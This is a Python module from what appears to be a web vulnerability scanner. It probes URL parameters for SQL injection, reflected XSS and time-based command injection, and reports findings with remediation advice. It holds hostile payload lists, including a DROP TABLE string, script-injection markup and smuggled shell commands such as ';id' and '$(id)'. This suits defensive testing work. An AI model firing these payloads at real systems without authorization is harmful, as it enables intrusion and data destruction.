"""Bonus: Basic injection detection — SQLi, XSS, command injection."""
import sys
import time

from ..config import ERROR_SIGNATURES, INJECTION_MARKER
from ..http_client import HTTPClient
from ..models import Finding, ScanContext


def _log(msg):
    print(f"[*] Attack bonus (injection): {msg}", file=sys.stderr)


# SQL injection payloads (error-based)
SQLI_PAYLOADS = [
    ("single_quote", "'"),
    ("double_quote", '"'),
    ("or_true", "' OR '1'='1"),
    ("union", "' UNION SELECT NULL--"),
    ("sleep", "' OR SLEEP(3)--"),
    ("semicolon", "'; DROP TABLE test--"),
]

# XSS payloads (reflected)
XSS_PAYLOADS = [
    ("basic_script", f"<script>{INJECTION_MARKER}</script>"),
    ("img_onerror", f'<img src=x onerror="{INJECTION_MARKER}">'),
    ("event_handler", f'" onmouseover="{INJECTION_MARKER}"'),
]

# Command injection payloads (blind/time-based)
CMDI_PAYLOADS = [
    ("pipe_id", "|id"),
    ("semicolon_id", ";id"),
    ("backtick", "`id`"),
    ("dollar_paren", "$(id)"),
    ("sleep_5", ";sleep 5"),
    ("pipe_sleep", "|sleep 5"),
]

SQL_ERROR_RE = ERROR_SIGNATURES[5][1]  # SQL error pattern


def run_injection(ctx: ScanContext):
    """Test for basic injection vulnerabilities."""
    candidates = ctx.endpoints_with_params()
    _log(f"Testing {len(candidates)} endpoints with params")

    client = HTTPClient(timeout=ctx.timeout)
    headers = {}
    if ctx.auth:
        headers["Authorization"] = ctx.auth

    found = 0

    for ep in candidates:
        url = ep.base_url()

        for param, original_value in ep.params.items():
            if not original_value:
                original_value = "1"

            # === SQLi (error-based) ===
            for label, payload in SQLI_PAYLOADS[:4]:
                test_url = f"{url}?{param}={original_value}{payload}"
                resp = client.request("GET", test_url, headers=headers)

                if resp.status == 0:
                    continue

                if SQL_ERROR_RE.search(resp.body or ""):
                    ctx.add_finding(Finding(
                        title=f"SQL injection (error-based): {param} "
                              f"with {label}",
                        severity="critical",
                        category="Injection",
                        method="GET",
                        path=ep.path,
                        host=ep.host,
                        status=resp.status,
                        evidence=f"Payload {label!r} triggered SQL error",
                        remediation="Use parameterized queries / prepared "
                                    "statements. Never concatenate user input "
                                    "into SQL.",
                        attack_phase="injection"))
                    found += 1
                    break

            # SQLi (time-based blind)
            sleep_url = f"{url}?{param}={original_value}' OR SLEEP(3)--"
            t0 = time.time()
            resp = client.request("GET", sleep_url, headers=headers)
            elapsed = time.time() - t0
            if elapsed >= 2.8 and resp.status != 0:
                # Verify with non-sleep request
                normal_url = f"{url}?{param}={original_value}"
                t1 = time.time()
                resp2 = client.request("GET", normal_url, headers=headers)
                normal_elapsed = time.time() - t1
                if elapsed > normal_elapsed * 2.5:
                    ctx.add_finding(Finding(
                        title=f"SQL injection (time-based blind): {param}",
                        severity="critical",
                        category="Injection",
                        method="GET",
                        path=ep.path,
                        host=ep.host,
                        status=resp.status,
                        evidence=f"SLEEP(3) caused {elapsed:.1f}s delay "
                                 f"vs {normal_elapsed:.1f}s normal",
                        remediation="Use parameterized queries.",
                        attack_phase="injection"))
                    found += 1

            # === XSS (reflected) ===
            for label, payload in XSS_PAYLOADS:
                test_url = f"{url}?{param}={payload}"
                resp = client.request("GET", test_url, headers=headers)

                if resp.status == 0:
                    continue

                if INJECTION_MARKER in (resp.body or ""):
                    # Check if it's reflected without encoding
                    if payload in (resp.body or ""):
                        ctype = (resp.ctype or "").lower()
                        if "html" in ctype or "text" in ctype:
                            ctx.add_finding(Finding(
                                title=f"Reflected XSS: {param} with {label}",
                                severity="high",
                                category="Injection",
                                method="GET",
                                path=ep.path,
                                host=ep.host,
                                status=resp.status,
                                evidence=f"Payload {label} reflected unescaped "
                                         f"in {ctype} response",
                                remediation="HTML-encode all user input in "
                                            "responses. Set Content-Type to "
                                            "application/json for API responses.",
                                attack_phase="injection"))
                            found += 1
                            break

            # === Command injection (time-based) ===
            sleep_url = f"{url}?{param}={original_value};sleep 5"
            t0 = time.time()
            resp = client.request("GET", sleep_url, headers=headers)
            elapsed = time.time() - t0
            if elapsed >= 4.5 and resp.status != 0:
                normal_url = f"{url}?{param}={original_value}"
                t1 = time.time()
                resp2 = client.request("GET", normal_url, headers=headers)
                normal_elapsed = time.time() - t1
                if elapsed > normal_elapsed * 3:
                    ctx.add_finding(Finding(
                        title=f"Command injection (time-based): {param}",
                        severity="critical",
                        category="Injection",
                        method="GET",
                        path=ep.path,
                        host=ep.host,
                        status=resp.status,
                        evidence=f"sleep 5 caused {elapsed:.1f}s delay "
                                 f"vs {normal_elapsed:.1f}s normal",
                        remediation="Never pass user input to shell commands. "
                                    "Use safe APIs that don't invoke a shell.",
                        attack_phase="injection"))
                    found += 1

    _log(f"Injection findings: {found}")
